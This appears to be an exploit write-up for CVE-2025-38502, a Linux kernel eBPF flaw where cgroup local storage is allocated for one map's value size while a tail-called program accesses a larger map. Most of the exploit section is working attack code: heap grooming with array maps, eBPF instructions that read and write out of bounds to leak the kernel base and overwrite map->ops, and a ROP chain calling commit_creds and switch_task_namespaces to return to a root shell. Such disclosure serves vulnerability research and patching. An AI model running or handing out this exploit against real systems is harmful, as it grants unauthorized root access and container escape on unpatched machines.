# Exploit detail about CVE-2025-38502
If you want to get some base information about CVE-2025-38502, please read [vulnerability.md](./vulnerability.md) first.

## Background
eBPF, which stands for extended Berkeley Packet Filter, is a revolutionary technology developed for Linux that enables a variety of tracing and performance analysis tasks directly in the operating system's kernel. Originally designed for network packet filtering, eBPF has evolved into a versatile tool with applications far beyond its initial purpose.

One of the key features of eBPF is its ability to run sandboxed programs within the Linux kernel without having to change the kernel source code or load custom kernel modules. This allows developers to safely and efficiently extend kernel functionality for purposes such as performance monitoring, networking, and security enhancements. Programs written for eBPF are first compiled into an intermediate representation and then verified by the kernel before execution to ensure they do not hang the system or perform unsafe operations.


## Cause anaylysis
In eBPF, there's a helper function `BPF_FUNC_get_local_storage`. Here's the document of this helper function:

```
Get the pointer to the local storage area. The type and the size of the local storage is defined by the map argument. The flags meaning is specific for each map type, and has to be 0 for cgroup local storage.

Depending on the BPF program type, a local storage area can be shared between multiple instances of the BPF program, running simultaneously.

A user should care about the synchronization by himself. For example, by using the BPF_ATOMIC instructions to alter the shared data.
```

In eBPF verifier, it stores local storage map pointr by the following code:
```
static int resolve_pseudo_ldimm64(struct bpf_verifier_env *env)
    ...
			if (bpf_map_is_cgroup_storage(map) &&
			    bpf_cgroup_storage_assign(env->prog->aux, map)) {
				verbose(env, "only one cgroup storage of each type is allowed\n");
				fdput(f);
				return -EBUSY;
			}
    ...
```

In function `bpf_test_run`, it allocates memory for local storage by the following code:
```
static int bpf_test_run(struct bpf_prog *prog, void *ctx, u32 repeat,
			u32 *retval, u32 *time, bool xdp)
{
    ...
	for_each_cgroup_storage_type(stype) {
		item.cgroup_storage[stype] = bpf_cgroup_storage_alloc(prog, stype);#here alloc the memory
        ...
		}
	}
    ...

struct bpf_cgroup_storage *bpf_cgroup_storage_alloc(struct bpf_prog *prog,
					enum bpf_cgroup_storage_type stype)
{
	const gfp_t gfp = __GFP_ZERO | GFP_USER;
	struct bpf_cgroup_storage *storage;
	struct bpf_map *map;
	size_t size;
	u32 pages;

	map = prog->aux->cgroup_storage[stype];
	if (!map)
		return NULL;

	size = bpf_cgroup_storage_calculate_size(map, &pages);

	storage = bpf_map_kmalloc_node(map, sizeof(struct bpf_cgroup_storage),
				       gfp, map->numa_node);
	if (!storage)
		goto enomem;

	if (stype == BPF_CGROUP_STORAGE_SHARED) {
		storage->buf = bpf_map_kmalloc_node(map, size, gfp,
						    map->numa_node);
    ...
	storage->map = (struct bpf_cgroup_storage_map *)map;
    ...
}
```
It allocates `storage->buf` depends on the `map->value_size` of the map used in the eBPF program. But if there's a tail call in eBPF program like this:
```
//program A
//program A calls program B through tail call at position (1):
BPF_LD_MAP_FD(BPF_REG_2, cgroup_map0), //here will call bpf_cgroup_storage_assign
BPF_LD_MAP_FD(BPF_REG_2, prog_array_map),
BPF_MOV64_IMM(BPF_REG_3, 0),
BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_tail_call),//( 1 )
BPF_MOV64_IMM(BPF_REG_0, 0),
BPF_EXIT_INSN(),


//program B
BPF_LD_MAP_FD(BPF_REG_1, cgroup_map1),
BPF_MOV64_IMM(BPF_REG_2, 0), //BPF_CGROUP_STORAGE_SHARED
BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_get_local_storage),
...
```

At this time, if you run program A through 'bpf_test_run', when applying for cgroup storage through the above code, it will be applied according to 'cgroup_map0->value_size' in program A; and when loading program B, the verifier will think that the map value size obtained by 'BPF_FUNC_get_local_storage' is the size of 'cgroup_map1->value_size'. This will eventually lead to out-of-bounds reading and writing of the applied cgroup storage in program B.

## Exploit

Just like description in `Cause anaylysis`, it's possible to do oob of the buf of local storage. I construct the heap feng shui in advance to make the local storage buf requested in `bpf_test_run` fall into a pile of `struct bpf_array`. In this way, after we can do OOB read and write of the local storage buf, we can leak information and hijack the control flow by reading and writing the `struct bpf_array`:
```
    //Before run the prog, do heap fengshui
    //Create many 'struct bpf_array', which will use kmalloc-4k
    int array_map_list[0x100];
    union bpf_attr map_attrs =
    {
        .map_type = BPF_MAP_TYPE_ARRAY,
        .key_size = 4,
        .value_size = 0x3e00,
        .max_entries = 1,
    };
    for(int i=0;i<0x100;i++){
           array_map_list[i] = create_map(&map_attrs);
    }
    //Delete some of them, we hope that 'bpf_test_run->bpf_cgroup_storage_alloc' can get back the released heap memory
    for(int i=0;i<0x100;i++){
        if(i%2==0)
                close(array_map_list[i]);
    }
```

We need two eBPF programs: `A` and `B`, and two cgroup maps: `cgroup_map0` and `cgroup_map1`. The value size of `cgroup_map0` is 0x3f00 and the value size of `cgroup_map1` is 0xf000.

The code of progam `A` is simple:
```
        //program A
        BPF_LD_MAP_FD(BPF_REG_2, pCtx->cgroup_map0), //here will call bpf_cgroup_storage_assign, the storage->buf will use kmalloc-4k
        BPF_LD_MAP_FD(BPF_REG_2, pCtx->prog_array_map),
        BPF_MOV64_IMM(BPF_REG_3, 0),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_tail_call), //here will call program B
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
```
It loads `cgroup_map0` and finally do tail call to program `B`.

And in program `B`, we do oob to the local storage buf and hijack the RIP through overwritng the `struct bpf_array -> map -> ops`:
```
        BPF_LD_MAP_FD(BPF_REG_1, pCtx->cgroup_map1),
        BPF_MOV64_IMM(BPF_REG_2, 0), //BPF_CGROUP_STORAGE_SHARED
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_get_local_storage),
        //Now we get the heap created in  bpf_test_run -> bpf_cgroup_storage_alloc.
        //We try to do oob read to confirm if the next heap is a 'struct bpf_array'
        BPF_LDX_MEM(BPF_H, BPF_REG_1, BPF_REG_0, 0x3ff0),//Read 'struct bpf_array . map . ops' low 2 bytes
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_1, ARRAY_MAP_OPS_OFF&0xffff, 2), //Check if the next heap is a 'struct bpf_array'
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),

        BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_0, 0x3ff0),//Get map -> ops, the address of array_map_ops; Get the offset from debugging
        BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, 0x3ff0+0xc0), //Get map ->rcu list. It is a two-way pointer pointing to itself. We will use w;

        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, 0x50),//Get bpf_array->value address. We put the map->ops here.
        BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_2, 0x3ff0), //Overwrite map->ops to bpf_array->value.
        BPF_LD_IMM64(BPF_REG_3, ARRAY_MAP_OPS_OFF),
        BPF_ALU64_REG(BPF_SUB, BPF_REG_1, BPF_REG_3), //calculate off to bypass ASLR
        BPF_LD_IMM64(BPF_REG_3, POP_RBX_RET),
        BPF_ALU64_REG(BPF_ADD, BPF_REG_3, BPF_REG_1), //calculate first gadget address

        //Now overwrite map->ops->map_delete_elem
        BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_3, 0x3ff0+0x110+0x70), //0x110 = offset(bpf_array, value), 0x70 = offset(bpf_map_ops, map_delete)
        //Next, we try to store th kernel off at data_array_map
        BPF_MOV64_REG(BPF_REG_8, BPF_REG_1),
        //Get the map_value of data_array_map
        BPF_LD_MAP_FD(BPF_REG_1, pCtx->data_array_map),
        BPF_MOV64_IMM(BPF_REG_2, 0),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_2, -0x10),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x10),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
        BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_8, 0),//Store the kernel off at &data_array_map->value[0]
        BPF_MOV64_IMM(BPF_REG_1, 1),
        BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_1, 8),//Store 1 at &data_array_map->value[8] to mark we have written the map->ops->map_delete_elem
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
```
And finally we do ROP in another eBPF program:
```
        //Pad stack
        BPF_LD_IMM64(BPF_REG_0, kernel_off + POP_RDI_RET),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0xa8),
        BPF_LD_IMM64(BPF_REG_0, kernel_off + INIT_CRED),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0xa0),
        BPF_LD_IMM64(BPF_REG_0, kernel_off + COMMIT_CREDS),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x98),
        BPF_LD_IMM64(BPF_REG_0, kernel_off + POP_RDI_RET),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x90),
        BPF_LD_IMM64(BPF_REG_0, 1),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x88),
        BPF_LD_IMM64(BPF_REG_0, kernel_off + FIND_TASK_BY_VPID),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x80),
        BPF_LD_IMM64(BPF_REG_0, kernel_off + MOV_RDI_RAX_POP_RBX_RET),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x78),
        BPF_LD_IMM64(BPF_REG_0, 0),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x70),
        BPF_LD_IMM64(BPF_REG_0, kernel_off + POP_RSI_RET),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x68),
        BPF_LD_IMM64(BPF_REG_0, kernel_off + INIT_NSPROXY),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x60),
        BPF_LD_IMM64(BPF_REG_0, kernel_off + SWITCH_TASK_NAMESPACES),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x58),
        //BPF_LD_IMM64(BPF_REG_0, kernel_off + LEAVE_RET),
        //BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x20),
        BPF_LD_IMM64(BPF_REG_0, kernel_off + SWAGPGS_RET),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x50),
        BPF_LD_IMM64(BPF_REG_0, kernel_off + IRETQ),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x48),
        BPF_LD_IMM64(BPF_REG_0, (uint64_t)shell),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x40),
        BPF_LD_IMM64(BPF_REG_0, user_cs),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x38),
        BPF_LD_IMM64(BPF_REG_0, user_rflags),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x30),
        BPF_LD_IMM64(BPF_REG_0, user_rsp|8),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x28),
        BPF_LD_IMM64(BPF_REG_0, user_ss),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_0, -0x20),
        //Jmp to gadget
        //Now we jmp to map->ops->map_update_elem
        BPF_LD_MAP_FD(BPF_REG_1, fd),
        BPF_MOV64_IMM(BPF_REG_2, 0),
        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_2, -0x10),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x10),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_delete_elem),// here will call 'pop rbx ; ret'
        //Exit
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
```
Why do I need to run another ebpf program?

Because even though we have modified `struct array_map ->map -> ops -> map_delete_elem` when executing the eBPF program `B`, we cannot directly hijack the control flow because of the following code:

```
static int do_misc_fixups(struct bpf_verifier_env *env)
{
	...
	if (prog->jit_requested && BITS_PER_LONG == 64 &&
		    (insn->imm == BPF_FUNC_map_lookup_elem ||
		     insn->imm == BPF_FUNC_map_update_elem ||
		     insn->imm == BPF_FUNC_map_delete_elem ||
		     insn->imm == BPF_FUNC_map_push_elem   ||
		     insn->imm == BPF_FUNC_map_pop_elem    ||
		     insn->imm == BPF_FUNC_map_peek_elem   ||
		     insn->imm == BPF_FUNC_redirect_map    ||
		     insn->imm == BPF_FUNC_for_each_map_elem ||
		     insn->imm == BPF_FUNC_map_lookup_percpu_elem)) {
			aux = &env->insn_aux_data[i + delta];
			if (bpf_map_ptr_poisoned(aux))
				goto patch_call_imm;
			map_ptr = BPF_MAP_PTR(aux->map_ptr_state);
			ops = map_ptr->ops;
			...
			switch (insn->imm) {
			...
			case BPF_FUNC_map_delete_elem:
				insn->imm = BPF_CALL_IMM(ops->map_delete_elem);
				continue;
			...
```
This code means that as long as our eBPF code passes the verifier, the verifier will directly hardcode `ops->map_delete_elem` into the eBPF code. Therefore, only after modifying `ops->map_delete_elem` and running a new eBPF code, can the control flow be hijacked.